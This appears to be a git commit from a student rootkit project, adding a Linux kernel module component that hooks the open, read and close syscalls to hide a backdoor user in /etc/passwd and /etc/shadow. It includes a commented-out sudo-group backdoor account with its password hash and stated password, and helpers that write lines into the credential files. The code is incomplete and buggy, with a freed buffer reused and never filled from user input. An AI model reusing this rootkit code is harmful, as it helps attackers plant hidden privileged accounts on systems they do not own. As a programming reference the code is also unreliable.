2a74a8e6afc031e996fa329eaf9802bbae6fa692
bdefino <bailey.defino@stonybrook.edu>
2019-11-30 18:37:06 -0500

    beginning fugitive integration

---
+++ core/include/fugitive.h
@@ -0,0 +1,100 @@
+#ifndef GHOST_H
+#define GHOST_H
+
+#include <linux/err.h>
+#include <linux/errno.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+// needed for file io
+#include <linux/fs.h>
+#include <linux/slab.h>
+
+#include "sctm.h"
+
+#undef LINE_MAX
+
+#define LINE_MAX (PATH_MAX << 4) /* reasonable upper limit on a line from "/etc/[passwd|shadow]", solely for convenience */
+
+#define PASSWD_PATH "/etc/passwd"
+#define SHADOW_PATH "/etc/shadow"
+#define GROUP_PATH "/etc/group"
+
+/*#define EVIL_USERNAME "fugitive"
+// /etc/passwd fields besides username
+#define PASSWD "x"
+#define UID "666"   // random uid, below 1000 to avoid conflict with user accounts
+#define GID "27"    // 27 is sudo group on ubuntu
+#define FULLNAME ""
+#define DIR "/home/fugitive"
+#define SHELL "/bin/bash"
+
+// /etc/shadow fields besides username, password is "Password123"
+#define PASSWD_SHA512 "$6$xBoTg.km$PKitMe/Qn6K4yoO.wrBSwvdtqSOc3Bfb5Mcn7S\
+sUito2AtUGPzE0JB/g/Li23t5Zp8YjKUOB9czKl3yMYJO35."
+#define LAST "0"
+#define MAY "0"
+#define MUST "99999"
+#define WARN_DAYS "7"
+#define EXPIRE ""
+#define DISABLE ""
+#define RESERVED ""*///disabled for now (prefer runtime input)
+
+// /etc/group fields
+
+// generates string that can be inserted into passwd and shadow files
+#define PASSWD_GEN(_evil_username, _passwd, _uid, _gid, _fullname, _dir, _shell) \
+        _evil_username ":" \
+        _passwd ":" \
+        _uid ":" \
+        _gid ":" \
+        _fullname ":" \
+        _dir ":" \
+        _shell "\n"
+
+#define SHADOW_GEN(_evil_username, _passwd_sha512, _last, _may, _must, _warn_days, _expire, _disable, _reserved) \
+        _evil_username ":" \
+        _passwd_sha512 ":" \
+        _last ":" \
+        _may ":" \
+        _must ":" \
+        _warn_days ":" \
+        _expire ":" \
+        _disable ":" \
+        _reserved "\n"
+// #define GROUP_GEN() 
+
+/* hide/show a user in "/etc/passwd" and "/etc/shadow" */
+
+static ssize_t append_to_file(char *, char *);
+
+asmlinkage ssize_t erase_time(int fd, void *buf, size_t count);
+
+/* remove a line from "/etc/passwd" and "/etc/shadow" */
+int fugitive(const char __user *line);
+
+/* convert a character array into an unsigned integer */
+static int fugitive__atoui(int *dest, const char *a);
+
+int fugitive_exit(void);
+
+int fugitive_init(struct sctm *sctm);
+
+/* extract the UID from an "/etc/passwd" line */
+static int fugitive__passwd_line_to_uid(uid_t *dest, const char *line);
+
+static int has_fug(char *, char *);
+
+int hide_fugitive(void);
+
+asmlinkage int king_crimson(char *pathname, int flags, mode_t mode);
+
+int show_fugitive(void);
+
+asmlinkage int this_is_requiem(int fd);
+
+/* restore a line in "/etc/passwd" and "/etc/shadow" */
+int unfugitive(const char __user *line);
+
+#endif
+
---
+++ core/src/fugitive.c
@@ -0,0 +1,326 @@
+#include "fugitive.h"
+
+/* hide/show a user in "/etc/passwd" and "/etc/shadow" */
+
+static int erased;
+static struct sctm_hook fugitive__hooks[3];
+static char *fugitive__line = NULL;
+static struct sctm *fugitive__sctm = NULL;
+
+/* remove a line from "/etc/passwd" and "/etc/shadow" */
+int fugitive(const char __user *line) {
+  char *_line;
+  int retval;
+  uid_t uid;
+  
+  if (fugitive__line != NULL)
+    return -EINVAL;
+  
+  if (line == NULL)
+    return -EFAULT;
+  
+  if (IS_ERR(line))
+    return -EINVAL;
+  _line = kcalloc(LINE_MAX, 1, GFP_KERNEL);
+  
+  if (IS_ERR_OR_NULL(_line))
+    return -ENOMEM;
+  retval = fugitive__passwd_line_to_uid(&uid, _line);
+  kfree(_line);
+  
+  if (retval) {
+    kfree(_line);
+    return retval;
+  }
+  fugitive__line = _line;
+  retval = hide_fugitive();
+  
+  if (retval) {
+    fugitive__line = NULL;
+    kfree(_line);
+  }
+  return retval;
+}
+
+static int fugitive__atoui(int *dest, const char *a) {
+  if (dest == NULL)
+    return -EFAULT;
+  
+  if (IS_ERR(dest))
+    return -EINVAL;
+  
+  if (a == NULL)
+    return -EFAULT;
+  
+  if (IS_ERR(a))
+    return -EINVAL;
+  *dest = 0;
+  
+  for (; *a; a++) {
+    if (*a < '0'
+        || *a > '9')
+      return -EINVAL;
+    *dest *= 10;
+    *dest += *a - '0';
+  }
+  return 0;
+}
+
+int fugitive_exit(void) {
+  int i;
+  
+  if (fugitive__sctm == NULL)
+    return -EFAULT;
+  
+  if (IS_ERR(fugitive__sctm))
+    return -EINVAL;
+  
+  /* unhook any remaining hooks */
+  
+  for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++)
+    sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
+  
+  /* prevent a memory leak */
+  
+  kfree(fugitive__line); /* `kfree` should be able to handle errors/NULLs */
+  return 0;
+}
+
+int fugitive_init(struct sctm *sctm) {
+  if (!IS_ERR_OR_NULL(fugitive__sctm))
+    return -EINVAL;
+  
+  if (sctm == NULL)
+    return -EFAULT;
+  
+  if (IS_ERR(sctm))
+    return -EINVAL;
+  
+  /* init hooks */
+  
+  fugitive__hooks[0] = (struct sctm_hook) {
+    .call = __NR_close,
+    .hook = (sctm_syscall_handler_t) &this_is_requiem
+  };
+  fugitive__hooks[1] = (struct sctm_hook) {
+    .call = __NR_open,
+    .hook = (sctm_syscall_handler_t) &king_crimson
+  };
+  fugitive__hooks[2] = (struct sctm_hook) {
+    .call = __NR_read,
+    .hook = (sctm_syscall_handler_t) &erase_time
+  };
+  
+  fugitive__sctm = sctm;
+  return 0;
+}
+
+static int fugitive__passwd_line_to_uid(uid_t *dest, const char *line) {
+  char *buf;
+  size_t bufsize;
+  int count;
+  char *p;
+  int retval;
+  char *start;
+  
+  if (line == NULL)
+    return -EFAULT;
+  
+  if (IS_ERR(line))
+    return -EINVAL;
+  
+  /* locate the start of the UID entry (index 2) */
+  
+  for (count = 0, p = (char *) line; count < 2 && *p; p++) {
+    if (*p == ':')
+      count++;
+  }
+  
+  if (count != 2)
+    return -EINVAL;
+  start = p;
+  
+  /* determine buffer size */
+  
+  for (bufsize = 0; *p && *p != ':'; bufsize++, p++);
+  
+  /* allocate buffer */
+  
+  buf = kcalloc(bufsize + 1, 1, GFP_KERNEL);
+  
+  if (IS_ERR_OR_NULL(buf))
+    return -ENOMEM;
+  
+  /* copy */
+  
+  strncpy(buf, start, bufsize);
+  
+  /* atoi */
+  
+  retval = fugitive__atoui(dest, buf);
+  kfree(buf);
+  return retval;
+}
+
+/* restore a line in "/etc/passwd" and "/etc/shadow" */
+int unfugitive(const char __user *line) {
+  char *_line;
+  int retval;
+  uid_t uid;
+  
+  if (fugitive__line != NULL)
+    return -EINVAL;
+  
+  if (line == NULL)
+    return -EFAULT;
+  
+  if (IS_ERR(line))
+    return -EINVAL;
+  _line = kcalloc(LINE_MAX, 1, GFP_KERNEL);
+  
+  if (IS_ERR_OR_NULL(_line))
+    return -ENOMEM;
+  retval = fugitive__passwd_line_to_uid(&uid, _line);
+  kfree(_line);
+  
+  if (retval) {
+    kfree(_line);
+    return retval;
+  }
+  fugitive__line = _line;
+  retval = show_fugitive();
+  
+  if (retval) {
+    fugitive__line = NULL;
+    kfree(_line);
+  }
+  return retval;
+}
+
+/*****************************************************************************/
+
+/*int import_fugitive(){
+    if(has_fug(PASSWD_PATH, PASSWD_GEN()))
+        append_to_file(PASSWD_PATH, PASSWD_GEN());
+    if(has_fug(SHADOW_PATH, SHADOW_GEN()))
+        append_to_file(SHADOW_PATH, SHADOW_GEN());
+    return 0;
+}*///could be useful in a future rootkit version
+
+int hide_fugitive(void){
+    int i;
+    int retval;
+    
+    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
+        if (fugitive__hooks[i].hooked)
+            return -EINVAL;
+    }
+    
+    /* add hooks */
+    
+    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
+        retval = sctm_hook(fugitive__sctm, &fugitive__hooks[i]);
+        
+        if (retval) {
+            for (; i >= 0; i--)
+                sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
+            return retval;
+        }
+    }
+    return 0;
+}
+
+int show_fugitive(void){
+    int hooked;
+    int i;
+    
+    for (hooked = i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
+        if (fugitive__hooks[i].hooked)
+            hooked++;
+    }
+    
+    if (!hooked)
+      return -EINVAL;
+    
+    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++)
+        sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
+    return 0;
+}
+
+/* append "fug" to the end of "file_path" */
+ssize_t append_to_file(char *file_path, char *fug){
+    struct file *f;
+    loff_t offset = 0;
+    ssize_t ret;
+
+    f = filp_open(file_path, O_WRONLY, ~O_CREAT);
+    if(f == NULL)
+        return ENOENT;
+
+    offset = vfs_llseek(f, offset, SEEK_END);
+    ret = kernel_write(f, fug, strlen(fug), &offset);
+    filp_close(f,NULL);
+    return ret;
+}
+
+/* return 0 if "file_path" has line "fug" */
+int has_fug(char *file_path, char *fug){
+    struct file *f;
+    loff_t offset;
+    loff_t line_start;
+    char *line_str;
+    char c;
+
+    f = filp_open(file_path, O_RDONLY, ~O_CREAT);
+    line_start = offset = 0;
+
+    if(f == NULL)
+        return ENOENT;
+
+    /* read f char by char up to '\n', then
+     * compare entire line to "fug"
+     */
+    while(kernel_read(f, &c, sizeof(char), &offset)){
+        if(c == '\n'){
+            line_str = kcalloc(offset-line_start+1, sizeof(char), GFP_KERNEL);
+            kernel_read(f, line_str, offset-line_start, &line_start);
+            if(!strcmp(line_str, fug)){
+                kfree(line_str);
+                return 0;
+            }
+            kfree(line_str);
+            line_start = offset;
+        }
+    }
+    // did not find fugitive
+    return -1;
+}
+
+asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
+    erased &= strcmp(PASSWD_PATH, pathname);
+    erased &= strcmp(SHADOW_PATH, pathname);
+    if(!erased){
+        //printk("need to hide file %s\n", pathname);
+        // HOOK_SYSCALL(sys_call_table, good_read, erase_time, __NR_read);
+    }
+    return (*fugitive__hooks[1].original)((unsigned long) pathname, (unsigned long) flags, (unsigned long) mode, 0L, 0L, 0L);
+}
+
+asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
+    ssize_t ret;
+    ret = (*fugitive__hooks[2].original)((unsigned long) fd, (unsigned long) buf, (unsigned long) count, 0L, 0L, 0L);
+
+    // if()
+    //printk("the power of king crimson!\n");
+    return ret;
+}
+
+asmlinkage int this_is_requiem(int fd){
+    if(!erased){
+        //printk("return hide file\n");
+        // UNHOOK_SYSCALL(sys_call_table, good_read, __NR_read);
+        erased = 1;
+    }
+    return (*fugitive__hooks[0].original)((unsigned long) fd, 0L, 0L, 0L, 0L, 0L);
+}
+
